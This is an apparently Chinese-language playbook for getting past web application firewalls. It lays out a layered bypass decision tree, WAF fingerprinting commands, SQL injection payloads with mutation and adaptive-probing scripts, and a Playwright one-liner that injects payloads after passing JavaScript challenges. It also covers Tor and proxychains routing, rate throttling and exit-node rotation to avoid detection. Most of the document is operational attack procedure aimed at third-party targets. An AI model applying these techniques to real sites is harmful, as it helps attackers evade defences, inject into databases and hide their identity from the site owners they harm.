# WAF/EDR 绕过工具箱

> 环境前提：Android proot Ubuntu 24.04 (aarch64 ARM64) | proxychains4 / torsocks | Playwright
> 变体库索引：`payloads/bypass/waf-bypass.md`（263 种变体分类）
> 变异脚本：`scripts/web/payload_mutator.py`、`scripts/web/adaptive_bypass.py`

## 1. 四层绕过决策树

当请求被 WAF 拦截（403/406/被重写）时，按以下层级递进，从低成本到高成本逐层尝试：

```
请求被拦截 (HTTP 403/406/连接重置/响应体被清洗)
│
├─ Layer 1: 编码层绕过（成本最低，先试）
│   ├─ URL 编码 / 双重编码 / Unicode 编码
│   ├─ Base64 / Hex / HTML 实体编码
│   ├─ 大小写混合 / 空白符插入 (Tab/LF/CR)
│   └─ 成功? → 记录有效编码，进入证据固化(见 03-evidence-discipline.md)
│        失败 ↓
├─ Layer 2: 语义层绕过（改写 payload 语义等价体）
│   ├─ 关键字替换: AND→&&, OR→||, UNION→UNIunionON
│   ├─ 注释分割: /*!50000union*/, --%0a
│   ├─ 函数等价: sleep()→benchmark(), version()→@@version
│   ├─ 参数污染: HPP (同参数多值，取最后一个)
│   └─ 成功? → 记录有效变体
│        失败 ↓
├─ Layer 3: 协议层绕过（改变传输协议/编码方式）
│   ├─ Content-Type 切换: urlencoded↔multipart↔json
│   ├─ Transfer-Encoding: chunked 分块传输
│   ├─ HTTP/2 / HTTP/3 降级或升级
│   ├─ 请求方法切换: GET↔POST↔PUT↔PATCH
│   └─ 成功? → 记录有效协议
│        失败 ↓
└─ Layer 4: 入口切换绕过（更换攻击入口路径）
    ├─ 寻找未受 WAF 保护的子域/旧版 API
    ├─ 移动端专用接口 (app.xxx.com / api/v1-mobile)
    ├─ WebSocket / SSE 通道（通常不经 WAF 规则）
    ├─ 直接访问源站 IP（绕过 CDN/WAF 代理）
    └─ Playwright 模拟真实浏览器（绕过 JS 挑战型 WAF）
```

## 2. WAF 指纹识别

被拦截后第一步：识别 WAF 类型，决定针对性策略。

```bash
# wafw00f 识别（经 proxychains 出网）
proxychains4 wafw00f "https://target.com" -a

# 手动探测：发送触发 payload 观察拦截特征
proxychains4 curl -s -D - "https://target.com/?id=1'+OR+1=1--" | grep -iE 'server|cf-ray|x-amz|x-cdn|blocked'

# 常见拦截特征对照
# Cloudflare  → cf-ray 头 / "Attention Required" 页面
# AWS WAF     → 403 + x-amzn-ErrorType
# 阿里云 SLB   → 405 / "Tengine" server 头
# ModSecurity → 403 + "Mod_Security" / "No SQL queries"
# 长亭雷池     → "长亭" / 拦截页含 chaitin 特征 / 403 无明显头
```

## 3. 常见 WAF 针对性绕过

| WAF | 特征 | 针对性绕过策略 | 变体库索引 |
|-----|------|---------------|-----------|
| Cloudflare | cf-ray 头，JS 挑战 | Layer4：Playwright 过 JS 挑战；分块传输；旧版 API 子域 | `waf-bypass.md#cloudflare` |
| AWS WAF | x-amzn 头，规则组可控 | Layer2：HPP 参数污染；注释分割；大小写混合 | `waf-bypass.md#aws` |
| 阿里云 | Tengine / 405 静默 | Layer1：双重 URL 编码；Unicode；chunked | `waf-bypass.md#aliyun` |
| ModSecurity | CRS 规则，报错明显 | Layer2：语义等价替换；函数替换；注释嵌套 | `waf-bypass.md#modsec` |
| 长亭雷池 | 语义分析，传统编码无效 | Layer4：入口切换为主；协议层 chunked；移动端接口 | `waf-bypass.md#chaitin` |

> 263 种变体的完整分类见 `payloads/bypass/waf-bypass.md`，按 WAF 类型 + 漏洞类型 + 层级三维索引。

## 4. Payload 变异策略

固定 payload 容易被规则命中，使用脚本动态生成变体并自适应探测。

```bash
# 基础变异：生成单 payload 的 N 个变体
python3 scripts/web/payload_mutator.py \
  --payload "1' UNION SELECT 1,2,3--" \
  --techniques url-encode,hpp,comment,case-mix \
  --count 50 --output variants.txt

# 自适应绕过：自动探测+学习有效变体
python3 scripts/web/adaptive_bypass.py \
  --url "https://target.com/search?q=INJECT" \
  --base-payload "1' OR '1'='1" \
  --proxy socks5://127.0.0.1:9050 \
  --success-marker "result" \
  --max-rounds 10

# Playwright 辅助：绕 JS 挑战后注入变异 payload
node -e "
const {chromium}=require('playwright-core');
(async()=>{
  const b=await chromium.launch({proxy:{server:'socks5://127.0.0.1:9050'}});
  const p=await b.newPage();
  await p.goto('https://target.com/search?q=1%27%20OR%20%271%27%3D%271');
  console.log(await p.content());
  await b.close();
})();
"
```

### 变异策略选择决策

```
WAF 类型已知?
├─ 是 → 加载针对性变体子集（见第3节索引）
└─ 否 → adaptive_bypass.py 全量探测

payload 数量需求?
├─ < 20 → payload_mutator.py 单次生成
└─ > 20 → adaptive_bypass.py 多轮迭代，保留有效变体
```

## 5. 绕过成功后的动作

1. 立即记录有效 payload 与绕过层级（写入 field-journal，见 `03-evidence-discipline.md`）
2. 用有效变体继续按 `01-attack-priority.md` 推进漏洞验证
3. 不要过度使用同一变体，防止触发速率限制/封禁

## 6. 速率与隐蔽控制

```bash
# 降低请求频率避免触发风控
proxychains4 curl --limit-rate 5k --connect-timeout 10 -s "https://target.com/"

# torsocks 备选（部分场景比 proxychains 兼容性好）
torsocks curl -s "https://target.com/?id=1"

# 切换 Tor 出口节点（被频控时）
# 在 proot 环境中通过 control 端口发 NEWNYM
```

## 7. 与其他方法论的关联

- 绕过后回到：`01-attack-priority.md` 继续漏洞验证
- 变体结果固化到：`03-evidence-discipline.md` 证据链
- 找不到入口时用：`04-control-gap-hunting.md` 扩展攻击面
